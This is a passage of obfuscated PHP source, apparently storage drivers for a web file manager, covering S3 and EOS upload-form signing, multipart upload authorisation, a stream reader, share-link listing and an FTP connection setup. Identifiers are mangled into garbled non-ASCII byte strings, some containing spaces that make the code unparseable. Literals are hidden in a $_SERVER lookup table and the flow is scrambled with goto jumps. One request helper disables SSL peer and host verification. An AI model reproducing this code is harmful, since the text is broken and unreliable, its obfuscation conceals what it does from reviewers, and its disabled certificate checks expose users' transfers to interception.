$_SERVER[£¿ÌÙëü¡¯¯]; $fœˆ¢•—ªé = $this->objectMeta($aÏüå°™õ¨); if (isset($fœˆ¢•—ªé[$Bƒô¬ÜΩ≤¡[193]])) { return $fœˆ¢•—ªé[$Bƒô¬ÜΩ≤¡[193]]; } $c¬∏ßÒ©†≤ = $this->link($aÏüå°™õ¨, $Bƒô¬ÜΩ≤¡[1195]); $DÕ‰∫∆Ÿ—ë = $this->qnRequest($c¬∏ßÒ©†≤, array(), !0); return !isset($DÕ‰∫∆Ÿ—ë[$Bƒô¬ÜΩ≤¡[194]]) ? !1 : $DÕ‰∫∆Ÿ—ë[$Bƒô¬ÜΩ≤¡[194]]; } public function qnRequest($Bô—ú∑ÜÇÓ, $b™æœä°í— = array(), $A˜◊¿â÷∫‚ = false) { goto A‚‡ãîäø»; Cœ∂ãö∏éΩ: curl_close($FâÊ«…Üèë); if ($A˜◊¿â÷∫‚) { return @json_decode($aúÜá¬›≤ , !0); } return $aúÜá¬›≤ ; goto dÒá†€ΩÈ; D®Ωÿö—Í”: curl_setopt($FâÊ«…Üèë, CURLOPT_FOLLOWLOCATION, 1); $aúÜá¬›≤  = curl_exec($FâÊ«…Üèë); curl_progress_end($FâÊ«…Üèë); goto Cœ∂ãö∏éΩ; FÚÌÜíè”î: curl_setopt($FâÊ«…Üèë, CURLOPT_RETURNTRANSFER, 1); curl_setopt($FâÊ«…Üèë, CURLOPT_CONNECTTIMEOUT, 3600); curl_setopt($FâÊ«…Üèë, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto BÁÛÈ¢° £; A‚‡ãîäø»: $Fõ‚÷ŒΩ¶“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FâÊ«…Üèë = curl_init(); curl_setopt($FâÊ«…Üèë, CURLOPT_URL, $Bô—ú∑ÜÇÓ); goto FÚÌÜíè”î; fÉ¢ç∫»Ü˘: curl_setopt($FâÊ«…Üèë, CURLOPT_PROGRESSFUNCTION, $Fõ‚÷ŒΩ¶“[1196]); curl_progress_start($FâÊ«…Üèë); if (isset($b™æœä°í—[$Fõ‚÷ŒΩ¶“[1153]]) && $b™æœä°í—[$Fõ‚÷ŒΩ¶“[322]] > 0) { $a÷Ø©€›¢€ = $b™æœä°í—[$Fõ‚÷ŒΩ¶“[1153]]; $bŒˆˆÇ≤ ¡ = $b™æœä°í—[$Fõ‚÷ŒΩ¶“[1153]] + ($b™æœä°í—[$Fõ‚÷ŒΩ¶“[322]] - 1); curl_setopt($FâÊ«…Üèë, CURLOPT_RANGE, "{$a÷Ø©€›¢€}\55{$bŒˆˆÇ≤ ¡}"); } goto D®Ωÿö—Í”; BÁÛÈ¢° £: curl_setopt($FâÊ«…Üèë, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($FâÊ«…Üèë, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($FâÊ«…Üèë, CURLOPT_NOPROGRESS, !1); goto fÉ¢ç∫»Ü˘; dÒá†€ΩÈ: } public function size($BÆÔÎ‚∫πΩ) { $C©Üù∆¿Ëı = $this->objectMeta($BÆÔÎ‚∫πΩ); return $C©Üù∆¿Ëı ? $C©Üù∆¿Ëı[$_SERVER[£¿ÌÙëü¡¯¯][78]] : 0; } public function info($Eç∑Ö—Ì Õ) { if ($this->isFolder($Eç∑Ö—Ì Õ)) { return $this->folderInfo($Eç∑Ö—Ì Õ); } else { if ($this->isFile($Eç∑Ö—Ì Õ)) { return $this->fileInfo($Eç∑Ö—Ì Õ); } } return !1; } public function exist($eŸ·‘ÿà“Œ) { return $this->isFile($eŸ·‘ÿà“Œ) || $this->isFolder($eŸ·‘ÿà“Œ); } public function isFile($cﬂù÷√∆µµ) { return !$this->isFolder($cﬂù÷√∆µµ) && $this->objectMeta($cﬂù÷√∆µµ); } public function isFolder($A∫Ê€õÃßë) { return $this->cacheMethod($_SERVER[£¿ÌÙëü¡¯¯][220], $A∫Ê€õÃßë); } protected function objectMeta($d∞µüò›ì¢) { return $this->cacheMethod($_SERVER[£¿ÌÙëü¡¯¯][221], $d∞µüò›ì¢); } protected function _objectMeta($dóìﬁÇ≥ÿÜ) { $AÇßµﬁ¿Ê§ =& $_SERVER[£¿ÌÙëü¡¯¯]; list($cæûÖæõ°Ñ, $D∑—∂í—–§) = $this->bucketManager->stat($this->bucket, $dóìﬁÇ≥ÿÜ); if ($cæûÖæõ°Ñ) { $cæûÖæõ°Ñ[$AÇßµﬁ¿Ê§[78]] = intval($cæûÖæõ°Ñ[$AÇßµﬁ¿Ê§[1183]]); } return $cæûÖæõ°Ñ; } protected function _isFolder($eúÖ˜ò…¯á) { $AÚÎ◊÷–ê∞ =& $_SERVER[£¿ÌÙëü¡¯¯]; list($eãÏËãõœŒ, $D™§Ü”éÚõ) = $this->bucketManager->listFiles($this->bucket, trim($eúÖ˜ò…¯á, $AÚÎ◊÷–ê∞[8]) . $AÚÎ◊÷–ê∞[8], $AÚÎ◊÷–ê∞[33], 1, $AÚÎ◊÷–ê∞[8]); return !empty($eãÏËãõœŒ[$AÚÎ◊÷–ê∞[1182]]) || !empty($eãÏËãõœŒ[$AÚÎ◊÷–ê∞[1185]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($F¨ä√¬„Ó„) { parent::__construct($F¨ä√¬„Ó„); } public function uploadFormData($b˜ÕéêÌß√, $CÏªàñ›„˜ = 3600) { goto DÛÊö¨ÖÑ’; b¿ØÁÙœéí: $aøèÜ¨‡πÉ = array($this->accessKey, $c∂´áÿÕìë, $this->region, $A˜âì˜À‰Ü, $C‹äíΩ≥°–); $bÌ≤åÖÉÿÒ = implode($B—‡Œ⁄Ç…Î[8], $aøèÜ¨‡πÉ); $d∂Ÿú©ï¨í = array($B—‡Œ⁄Ç…Î[1069] => gmdate($B—‡Œ⁄Ç…Î[1068], strtotime($B—‡Œ⁄Ç…Î[1103])), $B—‡Œ⁄Ç…Î[1070] => array(array($B—‡Œ⁄Ç…Î[1072] => $this->bucket), array($B—‡Œ⁄Ç…Î[1071] => $FΩ‘ÇÚ≥®µ), array($B—‡Œ⁄Ç…Î[1073], $B—‡Œ⁄Ç…Î[1074], $B—‡Œ⁄Ç…Î[33]), array($B—‡Œ⁄Ç…Î[1073], $B—‡Œ⁄Ç…Î[1104], $B—‡Œ⁄Ç…Î[33]), array($B—‡Œ⁄Ç…Î[1073], $B—‡Œ⁄Ç…Î[1105], $B—‡Œ⁄Ç…Î[33]), array($B—‡Œ⁄Ç…Î[1075] => $aãê¥Ü˘Ú), array($B—‡Œ⁄Ç…Î[1106] => $bÌ≤åÖÉÿÒ), array($B—‡Œ⁄Ç…Î[1107] => $F‡ÏΩ„´í£), array($B—‡Œ⁄Ç…Î[1108] => $C∆ª≥π¯ ©), array($B—‡Œ⁄Ç…Î[1109] => $b°ﬁ‚ë¿£ﬂ))); goto f°Òßá¿Ô; DÛÊö¨ÖÑ’: $B—‡Œ⁄Ç…Î =& $_SERVER[£¿ÌÙëü¡¯¯]; $FΩ‘ÇÚ≥®µ = $B—‡Œ⁄Ç…Î[182]; $F‡ÏΩ„´í£ = $B—‡Œ⁄Ç…Î[1100]; goto cë®ÉÒå¯á; B«‡¿¿Ç≤ª: $eÌ∑‰›ÁÖÁ = array($B—‡Œ⁄Ç…Î[196] => $B—‡Œ⁄Ç…Î[33], $B—‡Œ⁄Ç…Î[1112] => $B—‡Œ⁄Ç…Î[33], $B—‡Œ⁄Ç…Î[1071] => $FΩ‘ÇÚ≥®µ, $B—‡Œ⁄Ç…Î[1075] => $aãê¥Ü˘Ú, $B—‡Œ⁄Ç…Î[1079] => $CÚ”ñ˜ÒÉÊ, $B—‡Œ⁄Ç…Î[1113] => $bÌ≤åÖÉÿÒ, $B—‡Œ⁄Ç…Î[1114] => $F‡ÏΩ„´í£, $B—‡Œ⁄Ç…Î[1115] => $C∆ª≥π¯ ©, $B—‡Œ⁄Ç…Î[1116] => $b°ﬁ‚ë¿£ﬂ, $B—‡Œ⁄Ç…Î[1117] => $a–‚Üâ•Õ·, $B—‡Œ⁄Ç…Î[166] => $this->getHost()); return $eÌ∑‰›ÁÖÁ; goto F¶…ìê£çú; f¥ßêÑàÆ„: $cóˆÀû£„à = hash_hmac($B—‡Œ⁄Ç…Î[1110], $A˜âì˜À‰Ü, $D√ªè‰¡î≠, !0); $DÏ‘ıƒ§ïÎ = hash_hmac($B—‡Œ⁄Ç…Î[1110], $C‹äíΩ≥°–, $cóˆÀû£„à, !0); $a–‚Üâ•Õ· = hash_hmac($B—‡Œ⁄Ç…Î[1110], $CÚ”ñ˜ÒÉÊ, $DÏ‘ıƒ§ïÎ); goto B«‡¿¿Ç≤ª; cë®ÉÒå¯á: $A˜âì˜À‰Ü = $B—‡Œ⁄Ç…Î[59]; $C∆ª≥π¯ © = gmdate($B—‡Œ⁄Ç…Î[1101]); $c∂´áÿÕìë = gmdate($B—‡Œ⁄Ç…Î[677]); goto A‰Æâã‚…Ò; A‰Æâã‚…Ò: $C‹äíΩ≥°– = $B—‡Œ⁄Ç…Î[1102]; $b°ﬁ‚ë¿£ﬂ = $CÏªàñ›„˜ . $B—‡Œ⁄Ç…Î[33]; $aãê¥Ü˘Ú = $B—‡Œ⁄Ç…Î[1067]; goto b¿ØÁÙœéí; f°Òßá¿Ô: $CÚ”ñ˜ÒÉÊ = base64_encode(json_encode($d∂Ÿú©ï¨í)); $Aä£•“¥∆⁄ = hash_hmac($B—‡Œ⁄Ç…Î[1110], $c∂´áÿÕìë, $B—‡Œ⁄Ç…Î[1111] . $this->secret, !0); $D√ªè‰¡î≠ = hash_hmac($B—‡Œ⁄Ç…Î[1110], $this->region, $Aä£•“¥∆⁄, !0); goto f¥ßêÑàÆ„; F¶…ìê£çú: } public function multiUploadFormData($DÆ¢œ–àÒÙ, $A¨ØÊïâÇÿ = 3600) { $eÁ∂ƒôò“Ì =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cå”ù°»ö = gmdate($eÁ∂ƒôò“Ì[1197]); $a¬ƒâ≥÷Õç = array(); $BÕ˜©›∏”å = $this->client->getUploadId($this->bucket, $DÆ¢œ–àÒÙ, $a¬ƒâ≥÷Õç); if (!$BÕ˜©›∏”å) { return !1; } return array($eÁ∂ƒôò“Ì[206] => $BÕ˜©›∏”å, $eÁ∂ƒôò“Ì[166] => $this->getHost() . $eÁ∂ƒôò“Ì[8] . $this->pathEncode($DÆ¢œ–àÒÙ), $eÁ∂ƒôò“Ì[207] => $Cå”ù°»ö, $eÁ∂ƒôò“Ì[90] => $DÆ¢œ–àÒÙ); } public function multiUploadAuthData($f®ı‘„ÍÓ˜, $a“À¢’÷ü◊ = array()) { goto D‹õÊØ’»›; Aø’∑¬äü≠: if (isset($a“À¢’÷ü◊[$Bƒ›£ÈÓôﬂ[1198]])) { $b·Ö¢Ÿü°∫[$Bƒ›£ÈÓôﬂ[1199]] = $a“À¢’÷ü◊[$Bƒ›£ÈÓôﬂ[1198]]; } $C‡íµ∆ë∏ö = explode($Bƒ›£ÈÓôﬂ[168], $this->getHost()); $FéÈ›†‘É⁄ = array($Bƒ›£ÈÓôﬂ[1200] => $C‡íµ∆ë∏ö[1], $Bƒ›£ÈÓôﬂ[1201] => $Bƒ›£ÈÓôﬂ[33], $Bƒ›£ÈÓôﬂ[196] => $Bƒ›£ÈÓôﬂ[117], $Bƒ›£ÈÓôﬂ[1112] => $a“À¢’÷ü◊[$Bƒ›£ÈÓôﬂ[78]]); goto f‘éÇΩïß’; b¢ıü≠è˘º: if (strpos($AòÖÑıÁÛ±, $Bƒ›£ÈÓôﬂ[210]) === 0) { if (isset($b·Ö¢Ÿü°∫[$Bƒ›£ÈÓôﬂ[1199]])) { $Aã‡è§ﬂ—à = $b·Ö¢Ÿü°∫[$Bƒ›£ÈÓôﬂ[1199]]; } else { if (isset($D±≈¯˜Õ„Ω[$Bƒ›£ÈÓôﬂ[1199]])) { $Aã‡è§ﬂ—à = $D±≈¯˜Õ„Ω[$Bƒ›£ÈÓôﬂ[1199]]; } else { $Aã‡è§ﬂ—à = hash($Bƒ›£ÈÓôﬂ[1110], $Bƒ›£ÈÓôﬂ[33]); } } return array($Bƒ›£ÈÓôﬂ[217] => $D±≈¯˜Õ„Ω[$Bƒ›£ÈÓôﬂ[217]], $Bƒ›£ÈÓôﬂ[1199] => $Aã‡è§ﬂ—à, $Bƒ›£ÈÓôﬂ[207] => $D±≈¯˜Õ„Ω[$Bƒ›£ÈÓôﬂ[1202]]); } return $D±≈¯˜Õ„Ω[$Bƒ›£ÈÓôﬂ[217]]; goto D⁄ƒ•πó¶ï; Eó©«›Ûﬂ∫: unset($a“À¢’÷ü◊[$Bƒ›£ÈÓôﬂ[90]]); if (isset($a“À¢’÷ü◊[$Bƒ›£ÈÓôﬂ[208]])) { return $this->listUploadParts($dïΩ•ë¯ÜΩ, $a“À¢’÷ü◊); } $b·Ö¢Ÿü°∫ = array(); goto Aø’∑¬äü≠; D‹õÊØ’»›: $Bƒ›£ÈÓôﬂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AòÖÑıÁÛ± = isset($a“À¢’÷ü◊[$Bƒ›£ÈÓôﬂ[157]]) ? $a“À¢’÷ü◊[$Bƒ›£ÈÓôﬂ[157]] : $Bƒ›£ÈÓôﬂ[33]; $dïΩ•ë¯ÜΩ = $a“À¢’÷ü◊[$Bƒ›£ÈÓôﬂ[90]]; goto Eó©«›Ûﬂ∫; f‘éÇΩïß’: $Fä∞Óƒó∞ë = $Bƒ›£ÈÓôﬂ[211]; $aÓ•Î£çˆç = $Bƒ›£ÈÓôﬂ[8] . $this->pathEncode($dïΩ•ë¯ÜΩ) . $AòÖÑıÁÛ±; $D±≈¯˜Õ„Ω = $this->client->__getSignatureV4($b·Ö¢Ÿü°∫, $FéÈ›†‘É⁄, $Fä∞Óƒó∞ë, $aÓ•Î£çˆç); goto b¢ıü≠è˘º; D⁄ƒ•πó¶ï: } public function listUploadParts($eÔÒÕÍß·û, $Eÿ¬¬ Ò°≤ = array()) { goto d¯ŒÒÎÂ∏Ã; Aò°Ë∂ÆÑØ: $fÛﬂºßË‚ù .= $a–ÖÈ‡∆éª[1206]; $aö˘∑ëâº¶ = array(); $cÔﬂ≥Ñç‰° = explode($a–ÖÈ‡∆éª[168], $this->getHost()); goto dûñäÃ¨û‘; dÀΩ≈ø√Ü≈: if (!$eµùÃí≠ãÓ) { return !1; } $fÛﬂºßË‚ù = $a–ÖÈ‡∆éª[1203]; foreach ($eµùÃí≠ãÓ as $EË¬‘øõ±¢) { $fÛﬂºßË‚ù .= $a–ÖÈ‡∆éª[1204] . "\x3c\120\141\x72\x74\x4e\165\155\142\145\x72\76{$EË¬‘øõ±¢[$a–ÖÈ‡∆éª[1155]]}\x3c\x2f\x50\141\x72\x74\x4e\x75\x6d\142\x65\162\x3e\12" . "\x3c\x45\124\x61\x67\x3e{$EË¬‘øõ±¢[$a–ÖÈ‡∆éª[1156]]}\x3c\x2f\x45\x54\x61\x67\76\xa" . $a–ÖÈ‡∆éª[1205]; } goto Aò°Ë∂ÆÑØ; d¯ŒÒÎÂ∏Ã: $a–ÖÈ‡∆éª =& $_SERVER[£¿ÌÙëü¡¯¯]; $B‹†Éü√Ë¬ = str_replace($a–ÖÈ‡∆éª[218], $a–ÖÈ‡∆éª[33], $Eÿ¬¬ Ò°≤[$a–ÖÈ‡∆éª[157]]); $eµùÃí≠ãÓ = $this->client->listParts($this->bucket, $eÔÒÕÍß·û, $B‹†Éü√Ë¬); goto dÀΩ≈ø√Ü≈; dûñäÃ¨û‘: $BüË†–ëÊç = array($a–ÖÈ‡∆éª[1200] => $cÔﬂ≥Ñç‰°[1], $a–ÖÈ‡∆éª[196] => $a–ÖÈ‡∆éª[117], $a–ÖÈ‡∆éª[1112] => strlen($fÛﬂºßË‚ù)); $dØΩ⁄¢äõ = $a–ÖÈ‡∆éª[209]; $F¬ã£Î‰è™ = $a–ÖÈ‡∆éª[8] . $this->pathEncode($eÔÒÕÍß·û) . $Eÿ¬¬ Ò°≤[$a–ÖÈ‡∆éª[157]]; goto Dã¿„àﬂ∞∑; Dã¿„àﬂ∞∑: $CÚÆ˘˘¨√˘ = $this->client->__getSignatureV4($aö˘∑ëâº¶, $BüË†–ëÊç, $dØΩ⁄¢äõ, $F¬ã£Î‰è™, $fÛﬂºßË‚ù); return array($a–ÖÈ‡∆éª[217] => $CÚÆ˘˘¨√˘[$a–ÖÈ‡∆éª[217]], $a–ÖÈ‡∆éª[207] => $CÚÆ˘˘¨√˘[$a–ÖÈ‡∆éª[1202]], $a–ÖÈ‡∆éª[219] => $eµùÃí≠ãÓ, $a–ÖÈ‡∆éª[1199] => $CÚÆ˘˘¨√˘[$a–ÖÈ‡∆éª[1199]]); goto B◊“›ŒÈ—â; B◊“›ŒÈ—â: } public function link($EÒµü∞≥úû, $aŸ©¡≥ã≥ = array()) { return parent::link($EÒµü∞≥úû, $aŸ©¡≥ã≥); } public function fileOut($bÖ·üˆÊàª, $d≥ï”µ¬áÏ = false, $cŸŒÜ´á¡§ = false, $eı“ŸáÀˆ⁄ = '') { if (strstr($this->endpoint, $_SERVER[£¿ÌÙëü¡¯¯][1207])) { return parent::fileOutServer($bÖ·üˆÊàª, $d≥ï”µ¬áÏ, $cŸŒÜ´á¡§, $eı“ŸáÀˆ⁄); } parent::fileOut($bÖ·üˆÊàª, $d≥ï”µ¬áÏ, $cŸŒÜ´á¡§, $eı“ŸáÀˆ⁄); } public function fileOutImage($dªèÍ∫πΩ‚, $F›è‘ÁÊ—¡ = 250) { if (strstr($this->endpoint, $_SERVER[£¿ÌÙëü¡¯¯][1207])) { return parent::fileOutImageServer($dªèÍ∫πΩ‚, $F›è‘ÁÊ—¡); } parent::fileOutImage($dªèÍ∫πΩ‚, $F›è‘ÁÊ—¡); } public function fileOutLink($C◊Ï∂ñ∞¯á) { $e¡ˆ∂‘≈…È =& $_SERVER[£¿ÌÙëü¡¯¯]; if (substr($C◊Ï∂ñ∞¯á, 0, 7) == $e¡ˆ∂‘≈…È[1082]) { $C◊Ï∂ñ∞¯á = $e¡ˆ∂‘≈…È[1083] . substr($C◊Ï∂ñ∞¯á, 7); } header($e¡ˆ∂‘≈…È[153] . $C◊Ï∂ñ∞¯á); die; } public function getHost() { $D°Ö®Õ‰Ÿ‰ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aæ—¬∫ÉÁ™ = str_rtrim(parent::getHost(), $D°Ö®Õ‰Ÿ‰[8] . $this->bucket); $aæ—¬∫ÉÁ™ = explode($D°Ö®Õ‰Ÿ‰[168], $aæ—¬∫ÉÁ™); return $aæ—¬∫ÉÁ™[0] . $D°Ö®Õ‰Ÿ‰[168] . $this->bucket . $D°Ö®Õ‰Ÿ‰[94] . $aæ—¬∫ÉÁ™[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($B·Í”¯√à, $DˆâÖø§Üµ = 0) { parent::__construct(); $this->source = $B·Í”¯√à; $this->sourceSize = $DˆâÖø§Üµ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Cà°◊ïèÛ¯ = false) { return $this->sourceSize; } public function getContent($Aà÷∏ª∏Û’ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $AﬁΩ≈âæç„ = ftell($this->source); $fÌÈËü‚”á = @fread($this->source, $this->sourceSize); fseek($this->source, $AﬁΩ≈âæç„); return $fÌÈËü‚”á; } } public function fileSubstr($A“ìÚ‡‰Ω« = false, $b∞£À„»‚‚ = 0, $cÑ≠äÇêı„ = 0) { if (!$cÑ≠äÇêı„) { $cÑ≠äÇêı„ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $b∞£À„»‚‚, $cÑ≠äÇêı„); } if ($this->sourceType == self::TYPE_FILE) { $D√ø “ç·∂ = ftell($this->source); fseek($this->source, $D√ø “ç·∂ + $b∞£À„»‚‚); $dÈÁ¥ã¢ˆ¬ = @fread($this->source, $cÑ≠äÇêı„); fseek($this->source, $D√ø “ç·∂); return $dÈÁ¥ã¢ˆ¬; } } public function hashMd5($Cú°≤Ì¡Ò = false) { return md5($this->getContent()); } public static function hash($d∑ÜæŒ„îÚ, $bÇãã’ï…ñ = 0) { $cèÿ¯ú”°Ω = new PathDriverStream($d∑ÜæŒ„îÚ, $bÇãã’ï…ñ); return $cèÿ¯ú”°Ω->hashSimple($d∑ÜæŒ„îÚ); } public static function md5($c›ä≥áªÑ∫, $fÂÓ¶Öéπ∆ = 0) { $BıëÁçÁãó = new PathDriverStream($c›ä≥áªÑ∫, $fÂÓ¶Öéπ∆); return $BıëÁçÁãó->hashMd5($c›ä≥áªÑ∫); } } goto dØ±˘çü…å; aô„ò—‘ƒ˜: define($_SERVER[£¿ÌÙëü¡¯¯][1843], 2); define($_SERVER[£¿ÌÙëü¡¯¯][1844], 3); define($_SERVER[£¿ÌÙëü¡¯¯][1845], 4); goto dıˆû¯ªƒ‘; d£∂™ﬂ˜›Ç: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($E‰•≠Úàø§) { $this->pathParse = $E‰•≠Úàø§; } protected function infoParse($AÕû”Çáàß) { $E≥∞Ê√ÿÜã =& $_SERVER[£¿ÌÙëü¡¯¯]; return Action($E≥∞Ê√ÿÜã[991])->sharePathInfo($this->pathParse[$E≥∞Ê√ÿÜã[76]], !0); } public function listPath($c†Ò¢ÖéúÑ, $f√‰¢ÓÙ˜¯ = false) { $dõªÂ‘Ö∏ƒ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EÁàùûﬁÕÇ = IO::listPath($c†Ò¢ÖéúÑ, $f√‰¢ÓÙ˜¯); foreach ($EÁàùûﬁÕÇ as $dÙü¯÷◊¢ç => $eªÛ≠£øÓ∞) { if (!in_array($dÙü¯÷◊¢ç, array($dõªÂ‘Ö∏ƒ[74], $dõªÂ‘Ö∏ƒ[75]))) { continue; } foreach ($eªÛ≠£øÓ∞ as $bñ”∞≤òÏî => $c‡•ÇÃ±€Í) { $EÁàùûﬁÕÇ[$dÙü¯÷◊¢ç][$bñ”∞≤òÏî] = Action($dõªÂ‘Ö∏ƒ[991])->shareItemInfo($c‡•ÇÃ±€Í); } } return $EÁàùûﬁÕÇ; } public function listAll($Dï›ªéÉò⁄) { $Cå⁄•ÌıÊé =& $_SERVER[£¿ÌÙëü¡¯¯]; $dã•ŒçÉèß = IO::listAll($Dï›ªéÉò⁄); foreach ($dã•ŒçÉèß as &$Fî¬ ›„Ï«) { $Fî¬ ›„Ï« = array_merge(IO::info($Fî¬ ›„Ï«[$Cå⁄•ÌıÊé[76]]), $Fî¬ ›„Ï«); $Fî¬ ›„Ï«[$Cå⁄•ÌıÊé[388]] = Action($Cå⁄•ÌıÊé[991])->shareItemInfo($Fî¬ ›„Ï«); } return $dã•ŒçÉèß; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Eáãô∂ÌÊ∞) { parent::__construct($Eáãô∂ÌÊ∞); $this->signatureVersion($_SERVER[£¿ÌÙëü¡¯¯][197]); } public function uploadFormData($CŸœßç⁄“Õ, $cëù¥»”Ö≈ = 3600) { goto C⁄Œ‰ÑƒÇ≈; b…êÕ“£Ÿû: $eß˘ôÙÃ¶ä = hash_hmac($Eñò—§„éá[1110], $E€˘ÿï∆áâ, $c°Õœπ⁄Ú˜, !0); $AÖÜÕ£ÑÜ° = hash_hmac($Eñò—§„éá[1110], $BÌë°√ˆò®, $eß˘ôÙÃ¶ä, !0); $A‘òïÏäìƒ = hash_hmac($Eñò—§„éá[1110], $CüÉá“üÊï, $AÖÜÕ£ÑÜ°); goto FÖ÷Ë¡Üß; e≤ÈœÎöêô: $BÌë°√ˆò® = $Eñò—§„éá[1102]; $bπ·á◊å¬â = $cëù¥»”Ö≈ . $Eñò—§„éá[33]; $E†’èÎàÃ˘ = $Eñò—§„éá[1067]; goto dà÷’ıÇ™ñ; C⁄Œ‰ÑƒÇ≈: $Eñò—§„éá =& $_SERVER[£¿ÌÙëü¡¯¯]; $d§›ï‘§Çœ = $Eñò—§„éá[182]; $CíòÃÈã±Ø = $Eñò—§„éá[1100]; goto A√˘ÕÏæôΩ; CøÔˆÈÔü’: $CüÉá“üÊï = base64_encode(json_encode($eù÷ã ≈ÈÜ)); $e∫±àΩµπ = hash_hmac($Eñò—§„éá[1110], $e “ã—È≤∫, $Eñò—§„éá[1111] . $this->secret, !0); $c°Õœπ⁄Ú˜ = hash_hmac($Eñò—§„éá[1110], $this->region, $e∫±àΩµπ, !0); goto b…êÕ“£Ÿû; FÖ÷Ë¡Üß: $E‰†‰°∑ï = array($Eñò—§„éá[196] => $Eñò—§„éá[33], $Eñò—§„éá[1112] => $Eñò—§„éá[33], $Eñò—§„éá[1071] => $d§›ï‘§Çœ, $Eñò—§„éá[1075] => $E†’èÎàÃ˘, $Eñò—§„éá[1079] => $CüÉá“üÊï, $Eñò—§„éá[1113] => $B⁄òç∏£ò‘, $Eñò—§„éá[1114] => $CíòÃÈã±Ø, $Eñò—§„éá[1115] => $eÜÇÚôï¬ß, $Eñò—§„éá[1116] => $bπ·á◊å¬â, $Eñò—§„éá[1117] => $A‘òïÏäìƒ, $Eñò—§„éá[166] => $this->getHost()); return $E‰†‰°∑ï; goto BúäÜ˜ûê∫; dà÷’ıÇ™ñ: $D®Î¯ Óóú = array($this->accessKey, $e “ã—È≤∫, $this->region, $E€˘ÿï∆áâ, $BÌë°√ˆò®); $B⁄òç∏£ò‘ = implode($Eñò—§„éá[8], $D®Î¯ Óóú); $eù÷ã ≈ÈÜ = array($Eñò—§„éá[1069] => gmdate($Eñò—§„éá[1068], strtotime($Eñò—§„éá[1103])), $Eñò—§„éá[1070] => array(array($Eñò—§„éá[1072] => $this->bucket), array($Eñò—§„éá[1071] => $d§›ï‘§Çœ), array($Eñò—§„éá[1073], $Eñò—§„éá[1074], $Eñò—§„éá[33]), array($Eñò—§„éá[1073], $Eñò—§„éá[1104], $Eñò—§„éá[33]), array($Eñò—§„éá[1073], $Eñò—§„éá[1105], $Eñò—§„éá[33]), array($Eñò—§„éá[1075] => $E†’èÎàÃ˘), array($Eñò—§„éá[1106] => $B⁄òç∏£ò‘), array($Eñò—§„éá[1107] => $CíòÃÈã±Ø), array($Eñò—§„éá[1108] => $eÜÇÚôï¬ß), array($Eñò—§„éá[1109] => $bπ·á◊å¬â))); goto CøÔˆÈÔü’; A√˘ÕÏæôΩ: $E€˘ÿï∆áâ = $Eñò—§„éá[59]; $eÜÇÚôï¬ß = gmdate($Eñò—§„éá[1101]); $e “ã—È≤∫ = gmdate($Eñò—§„éá[677]); goto e≤ÈœÎöêô; BúäÜ˜ûê∫: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($D›∫ªœâÆµ) { parent::__construct(); if (count($D›∫ªœâÆµ) > 0) { $this->_init($D›∫ªœâÆµ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Aÿ ∫ïôºÁ) { $Eã°ÚîáÖ∂ =& $_SERVER[£¿ÌÙëü¡¯¯]; global $config; $this->appCharset = $config[$Eã°ÚîáÖ∂[1118]]; $this->systemCharset = $config[$Eã°ÚîáÖ∂[1119]]; if (isset($Aÿ ∫ïôºÁ[$Eã°ÚîáÖ∂[1120]]) && $Aÿ ∫ïôºÁ[$Eã°ÚîáÖ∂[1120]]) { $this->systemCharset = $Aÿ ∫ïôºÁ[$Eã°ÚîáÖ∂[1120]]; } } public function iconvApp($AåòîŒçÚ√) { return $this->iconvTo($AåòîŒçÚ√, $this->systemCharset, $this->appCharset); } public function iconvSystem($C”«ÖéÙàæ) { return $this->iconvTo($C”«ÖéÙàæ, $this->appCharset, $this->systemCharset); } public function getPathOuter($Bçª √•Ùê) { goto fø€¥íâéË; D¶Ö£Ïàñ: $Bçª √•Ùê = KodIO::clear($Bçª √•Ùê); $Bçª √•Ùê = substr($Bçª √•Ùê, strlen($a±π¢≠ πô)); if (empty($this->pathDriver)) { return $Bçª √•Ùê; } goto CÂã∂Êóı´; fø€¥íâéË: $E° ó≠«Ω =& $_SERVER[£¿ÌÙëü¡¯¯]; $a±π¢≠ πô = $this->iconvApp($this->pathBase); $Bçª √•Ùê = $this->iconvApp($Bçª √•Ùê); goto E…á€®ÖÌ ; CÂã∂Êóı´: return $this->pathDriver . $E° ó≠«Ω[8] . ltrim($Bçª √•Ùê, $E° ó≠«Ω[8]); goto EèôòÖáøç; E…á€®ÖÌ : if (substr($a±π¢≠ πô, 0, 2) == $E° ó≠«Ω[1121]) { $a±π¢≠ πô = BASIC_PATH . substr($a±π¢≠ πô, 2); } if (substr($Bçª √•Ùê, 0, 2) == $E° ó≠«Ω[1121]) { $Bçª √•Ùê = BASIC_PATH . substr($Bçª √•Ùê, 2); } $a±π¢≠ πô = KodIO::clear($a±π¢≠ πô); goto D¶Ö£Ïàñ; EèôòÖáøç: } private function _init($e∫é±∏¶çì = array()) { goto eøÆˆΩÌã◊; eñåß—¯ºΩ: return $cÆ∂Ù°§òç; goto c®àØŒ“í≤; Fúò€¥“ß∆: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $cÆ∂Ù°§òç = @ftp_login($this->connect, $this->username, $this->userpass); goto bäºÃÓŸ∞é; bäºÃÓŸ∞é: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); 